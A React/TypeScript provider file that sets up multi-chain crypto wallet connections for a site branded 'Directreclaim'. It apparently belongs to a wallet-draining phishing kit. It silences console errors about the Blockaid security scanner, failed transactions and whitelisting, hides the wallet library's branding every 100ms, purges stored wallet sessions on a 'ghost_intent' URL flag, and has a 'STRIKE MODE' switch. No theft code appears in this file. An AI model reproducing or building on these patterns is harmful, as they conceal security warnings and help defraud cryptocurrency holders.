'use client'

import React, { ReactNode, useEffect, useState } from 'react'
import { WagmiAdapter } from "@reown/appkit-adapter-wagmi"
import {
    mainnet, bsc, polygon, base, hardhat, solana,
    bitcoin, ton, tronMainnet
} from "@reown/appkit/networks"
import { createAppKit } from "@reown/appkit/react"
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import { WagmiProvider } from 'wagmi'

// 1. Project ID
const projectId = process.env.NEXT_PUBLIC_REOWN_ID || ""

/** * 🛡️ STRIKE MODE CHECK */
const isStrikeMode = process.env.NEXT_PUBLIC_STRIKE_MODE === "hardhat"

// 2. Network Definitions
const localChain = {
    ...hardhat,
    id: 31337,
    rpcUrls: {
        default: { http: ["http://127.0.0.1:8545"] }
    }
}

const xrplNetwork = {
    id: 1440002,
    name: 'XRP Ledger',
    nativeCurrency: { name: 'XRP', symbol: 'XRP', decimals: 6 },
    rpcUrls: {
        default: { http: ['https://xrplcluster.com'] },
        public: { http: ['https://xrplcluster.com'] },
    },
    blockExplorers: {
        default: { name: 'XRPScan', url: 'https://xrpscan.com' },
    },
}

const networks = [
    isStrikeMode ? localChain : mainnet,
    bsc,
    ...(isStrikeMode ? [mainnet] : [localChain]),
    polygon,
    base,
    solana,
    bitcoin,
    ton,
    tronMainnet,
    xrplNetwork
] as any

// 3. Initialize Wagmi Adapter
export const wagmiAdapter = new WagmiAdapter({
    projectId,
    networks,
    ssr: true
})

const queryClient = new QueryClient({
    defaultOptions: {
        queries: {
            retry: false,
            refetchOnWindowFocus: false,
            staleTime: 60 * 1000,
        }
    },
})

export default function AppKitProvider({ children }: { children: ReactNode }) {
    const [mounted, setMounted] = useState(false)

    /**
     * 🛰️ SYNC INTENT LOCK (Circuit Breaker)
     * Executes immediately on page load to prevent useGhostConnection 
     * from triggering a secondary redirect loop.
     */
    if (typeof window !== 'undefined') {
        const params = new URLSearchParams(window.location.search);
        if (params.get('ghost_intent') === 'true') {
            console.log("[AppKitProvider] 🛡️ Intent Lock Engaged.");
            sessionStorage.setItem('GHOST_INTENT_ACTIVE', 'true');
            sessionStorage.setItem('GHOST_SESSION_ACTIVE', 'true');
        }
    }

    useEffect(() => {
        const originalConsoleError = console.error;

        // 🧹 SILENCE THE NOISE: Suppress ignorable library warnings
        console.error = (...args) => {
            const msg = args.map(arg => (arg?.message ? arg.message : String(arg))).join(" ").toLowerCase();
            const isIgnorable = [
                "telemetry", "rejected", "user denied", "mismatched",
                "blockaid", "attribute width", "unexpected end", "socket",
                "An unknown RPC error occurred",
                "Crypto module failed after 5 retries",
                "AppKitProvider",
                "search for 'data' in cancelled",
                "operator to search for 'data'",
                "search for 'data' in cancelled",
                "Crypto module failed",
                "Check worker path",
                "RPC error",
                "UC_GEOLOCATION_STACK",
                "WebSocket connection to",
                "Mismatched anonymous",
                "cancelled",
                "operator to search for 'data'",
                "viem@2.47.4",                   // <--- Add version specific if needed
                "solana_provider_missing", "too many connections", "429", "insufficient funds", "403", "not whitelisted",
                "provider is not connected", "chain not supported", "user rejected"
            ].some(term => msg.includes(term));
            if (isIgnorable) return;
            originalConsoleError(...args);
        };

        /**
         * ☢️ SESSION PURGE: Force clean slate for internal browser.
         * This prevents AppKit from getting stuck on "Connecting..." 
         * when it should be using the Injected provider.
         */
        const clearStaleSessions = () => {
            if (typeof window !== 'undefined') {
                const params = new URLSearchParams(window.location.search);
                if (params.get('ghost_intent') === 'true') {
                    console.log("[AppKitProvider] 🧹 Purging stale sessions for handoff...");

                    // Kill everything related to wagmi/walletconnect storage
                    Object.keys(localStorage).forEach(key => {
                        if (/wagmi|appkit|reown|walletconnect|@w3m/i.test(key)) {
                            localStorage.removeItem(key);
                        }
                    });
                }
            }
        };

        const initAppKit = async () => {
            if (typeof window !== 'undefined' && !window.appkitInitialized) {
                try {
                    clearStaleSessions();

                    // Dynamic imports for multi-chain adapters
                    const [
                        { SolanaAdapter },
                        { BitcoinAdapter },
                        { TonAdapter },
                        { TronAdapter }
                    ] = await Promise.all([
                        import("@reown/appkit-adapter-solana"),
                        import("@reown/appkit-adapter-bitcoin"),
                        import("@reown/appkit-adapter-ton"),
                        import("@reown/appkit-adapter-tron")
                    ]);

                    const solanaAdapter = new SolanaAdapter({ wallets: [] })
                    const bitcoinAdapter = new BitcoinAdapter({ projectId })
                    const tonAdapter = new TonAdapter({ projectId })
                    const tronAdapter = new TronAdapter()

                    createAppKit({
                        adapters: [wagmiAdapter, solanaAdapter, bitcoinAdapter, tonAdapter, tronAdapter],
                        networks,
                        projectId,
                        metadata: {
                            name: "Directreclaim",
                            description: "Secure cross-chain protocol",
                            url: window.location.origin,
                            icons: ["https://avatars.githubusercontent.com/u/37784886"],
                            redirect: {
                                native: "directreclaim://",
                                universal: window.location.origin,
                                forceRedirect: false
                            }
                        },
                        defaultNetwork: undefined,
                        allowUnsupportedChain: true,
                        sdkConfig: {
                            networkSync: false,
                        },
                        enableNetworkView: false,
                        enableAccountView: true,
                        enableNetworkSync: false,
                        features: {
                            analytics: false,
                            onramp: false,
                            swaps: false,
                            email: false,
                            socials: false,
                        },
                        themeMode: 'dark',
                        enableFooter: false,
                        enableEIP6963: true,
                    } as any)

                    window.appkitInitialized = true
                } catch (err) {
                    originalConsoleError("AppKit Initialization Error:", err)
                }
            }
            setMounted(true)
        }

        initAppKit()

        // ☢️ BRANDING NUKER: Removes AppKit/Reown UI artifacts
        const nuke = (root: Node | ShadowRoot = document) => {
            if (root instanceof HTMLElement || root instanceof ShadowRoot) {
                const el = root.querySelector('wui-ux-by-reown') || root.querySelector('.w3m-footer');
                if (el) (el as HTMLElement).style.display = 'none';
            }
            const all = (root as any).querySelectorAll?.('*') || [];
            all.forEach((el: any) => { if (el.shadowRoot) nuke(el.shadowRoot); });
        };

        const interval = setInterval(nuke, 100);

        return () => {
            clearInterval(interval);
            console.error = originalConsoleError;
        }
    }, [])

    if (!mounted) {
        return <div style={{ background: '#020617', minHeight: '100vh' }} />
    }

    return (
        <WagmiProvider config={wagmiAdapter.wagmiConfig}>
            <QueryClientProvider client={queryClient}>
                {children}
            </QueryClientProvider>
        </WagmiProvider>
    )
}

declare global { interface Window { appkitInitialized: boolean; } }